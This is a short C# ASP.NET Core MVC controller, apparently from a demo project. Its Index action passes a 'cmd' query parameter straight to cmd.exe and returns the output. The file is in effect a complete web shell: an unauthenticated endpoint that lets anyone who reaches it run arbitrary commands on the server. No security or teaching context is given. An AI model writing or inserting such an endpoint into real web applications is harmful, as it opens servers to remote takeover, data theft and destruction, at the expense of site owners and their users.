using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;

namespace MVCDemo.Controllers
{
    public class CmdController : Controller
    {
        [HttpGet]
        public IActionResult Index(string cmd)
        {
            ViewData["Result"] = ExecuteCommand(cmd);
            return View();
        }

        private string ExecuteCommand(string command)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.WriteLine($"{command}&exit");
            p.StandardInput.AutoFlush = true;
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            return output;
        }
    }
}
